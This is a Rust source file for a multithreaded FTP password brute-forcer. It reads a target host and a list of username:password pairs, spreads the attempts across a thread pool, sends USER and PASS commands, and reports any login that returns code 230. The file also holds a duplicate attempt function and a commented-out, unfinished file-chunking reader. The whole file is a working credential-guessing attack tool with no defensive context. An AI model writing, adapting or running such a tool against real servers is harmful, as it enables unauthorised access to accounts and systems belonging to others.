mod constants;

use clap::Parser;
use constants::MAX_MESSAGE_SIZE;
use itertools::Itertools;
use std::fs::File;

use std::io::BufReader;
use std::sync::mpsc::{channel, Receiver, Sender};
use std::{
    fs::read_to_string,
    io::{Read, Result, Write},
    net::TcpStream,
    path::Path,
    sync::{Arc, Condvar, Mutex},
    time::Instant,
    vec::Vec,
};
use threadpool::ThreadPool;

#[derive(Parser, Debug)]
struct Raw_Args {
    // path to .txt file containing list of IPs
    #[clap(short, long)]
    host: String,
    // path to .txt file containing list of passwords
    #[clap(short, long)]
    credentials: String,
}


struct Parsed_Args {
    host: String,
    credentials: Vec<Vec<String>>,
}



trait Connect_To_Server {
    fn new(host: String) -> Self;
    fn send(&self,credential: &str, stream: &mut TcpStream, sender: &Sender<u32>) -> Result<u8>;
    fn can_connect(&self,stream: &mut TcpStream) -> bool;
    fn connect_tcp(&self) -> TcpStream;
}

struct Server{
    host: String
}

impl Connect_To_Server for Server {
    fn new(host: String) -> Self {
        Server {
        host:host}
    }

    fn connect_tcp(&self) -> TcpStream {
        return  TcpStream::connect(self.host.clone()).unwrap();
    }

    fn send(&self,credential: &str, stream: &mut TcpStream, sender: &Sender<u32>) -> Result<u8> {
        if let [username, password] = &credential.split(':').take(2).collect::<Vec<&str>>()[..] {
            sender.send(1);
            let mut buffer = [0; MAX_MESSAGE_SIZE];

            println!("attempting: {} {}", username, password);
            stream.write(format!("USER {}\r\n", username).as_bytes())?;
            let mut buffer = [0; MAX_MESSAGE_SIZE];
            stream.read(&mut buffer)?;
            // code 331 (User name okay, need password)
            if buffer[..3] == [51, 51, 49] {
                stream.write(format!("PASS {}\r\n", password).as_bytes())?;
                stream.read(&mut buffer)?;
                // code 230 (User logged in, proceed. Logged out if appropriate)
                if buffer[..3] == [50, 51, 48] {
                    return Ok(1);
                }
            }
        }
        return Ok(0);
    }

    fn can_connect(&self,stream: &mut TcpStream) -> bool {
        let mut buffer = [0; MAX_MESSAGE_SIZE];
        stream.read(&mut buffer).unwrap();
        // read welcome message and make sure the code is 220 (Service ready for new user)
        if buffer[..3] == [50, 50, 48] {
            return true;
        } else {
            println!(
                "It appears that {:?} is not ready for new connections",
                self.host
            );
            return false
        }
    }
    
} 

fn get_cred() -> Parsed_Args {
    let args = Raw_Args::parse();
    let host = args.host;
    fn crad_to_chunks(credentials: &str) -> Vec<Vec<String>>{
        let credential_list: Vec<String> = read_file_lines(credentials);
        println!("Found {:?} Credential(s)", credential_list.len());
        println!("Starting...");
        let chunks: Vec<Vec<String>> = credential_list
            .into_iter()
            .chunks(10)
            .into_iter()
            .map(|chunk| chunk.collect())
            .collect();
        return  chunks;
    }

    return Parsed_Args{credentials:crad_to_chunks(&args.credentials),host: host }

}



fn main() -> Result<()> {
    // get the cradential list from the arguments
    let args = get_cred();
    let host = args.host;
    let chunks = args.credentials;

    let now = Instant::now();
    let pool = ThreadPool::new(4);
    let pair = Arc::new((Mutex::new(false), Condvar::new()));
    let (sender, receiver): (Sender<u32>, Receiver<u32>) = channel();
    // loop over chunk
    for cred_chunk in chunks {
        // let cloned_host = host.clone();
        let pair2 = pair.clone();
        let sender = sender.clone();
        let host = host.clone();

        // give chunks to threads
        pool.execute(move || {
            let server = Server{host:host.clone()};
            let cred_chunk = cred_chunk.clone();
            let mut stream = server.connect_tcp();
            if server.can_connect(&mut stream) {
                for cred in &cred_chunk {
                    match server.send(cred, &mut stream, &sender) {
                        Ok(code) => {
                            if code == 1 {
                                println!("------------- SUCCESS -------------");
                                println!("{}", cred);
                                println!("------------- SUCCESS -------------");
                                let &(ref lock, ref cvar) = &*pair2;
                                let mut done = lock.lock().unwrap();
                                *done = true;
                                // We notify the condvar that the value has changed.
                                cvar.notify_one();
                            }
                        }
                        Err(err) => {
                            println!("{:}", err)
                        }
                    }
                }
            } else {
                println!(
                    "It appears that is not ready for new connections"
                );
            }
        })
    }
    // wait for the thread to start up
    let &(ref lock, ref cvar) = &*pair;
    let mut done = lock.lock().unwrap();
    while !*done {
        done = cvar.wait(done).unwrap();
    }
    println!("Total attempts {}", receiver.try_iter().count());
    println!("Total time elapsed: {}", now.elapsed().as_secs());
    Ok(())
}

fn read_file_lines(file_name: &str) -> Vec<String> {
    let file_exists = Path::new(&file_name).is_file();
    if !file_exists {
        panic!("{}", format!("File {} does not exist!", file_name))
    }
    let contents = read_to_string(&file_name)
        .unwrap_or_else(|_| panic!("Error reading from file {}", file_name));
    return contents.lines().map(|line| line.to_string()).collect();
}

fn attempt(credential: &str, stream: &mut TcpStream, sender: &Sender<u32>) -> Result<u8> {
    if let [username, password] = &credential.split(':').take(2).collect::<Vec<&str>>()[..] {
        sender.send(1);
        println!("attempting: {} {}", username, password);
        stream.write(format!("USER {}\r\n", username).as_bytes())?;
        let mut buffer = [0; MAX_MESSAGE_SIZE];
        stream.read(&mut buffer)?;
        // code 331 (User name okay, need password)
        if buffer[..3] == [51, 51, 49] {
            stream.write(format!("PASS {}\r\n", password).as_bytes())?;
            stream.read(&mut buffer)?;
            // code 230 (User logged in, proceed. Logged out if appropriate)
            if buffer[..3] == [50, 51, 48] {
                return Ok(1);
            }
        }
    }
    return Ok(0);
}



// struct IFetcher{ 
//     credential_path: &str,
//     reserve_block: Vec<Vec<String>>,
//     fetch_block: Vec<Vec<String>>,
//     reader: FileReader
// }
// trait Fetcher {
//     fn new(credential_path: &str) -> Self;
//     fn get_chunk(&self) -> Vec<String>;
//     fn close_connection(&self) -> bool;
//     fn _transfer_to_fetch_block(&self);
//     fn _fetch_from_file(&self) ->  Vec<Vec<String>>;
// }

// impl Fetcher for IFetcher {
//     fn new(credential_path: &str) -> Self {
//         Self {
//             credential_path: credential_path,
//             fetch_block: Vec::new(),
//             reserve_block: Vec::new()
//         }
//     }

//     fn get_chunk(&self) {
//         if self.fetch_block.count() > 0 {
//             return self.fetch_block.pop()
//         }
//     }

//     fn _transfer_to_fetch_block(&self) {
//         self.fetch_block = self.reserve_block;
//         self.reserve_block = self._fetch_from_file();
//     }

//     fn _fetch_from_file(&self) ->  Vec<Vec<String>> {
//         let reader = self.reader
//     }
// }

// struct FileReader {
//     buffReader: BufReader<File>
// }

// impl FileReader {
//     fn new(credential_path: &str) -> Self {
//         Self {
//             buffReader:  BufReader::new(File::open(credential_path)?)
//         }
//     }

//     fn get_chunk() -> Vec<Vec<String>>{
//         return  Vec::new();
//     }

//     // fn _create_buf_reader(credential_path: &str) {
//     //     let file = File::open("foo.txt")?;
//     //     return BufReader::new(file);


//     // }

// }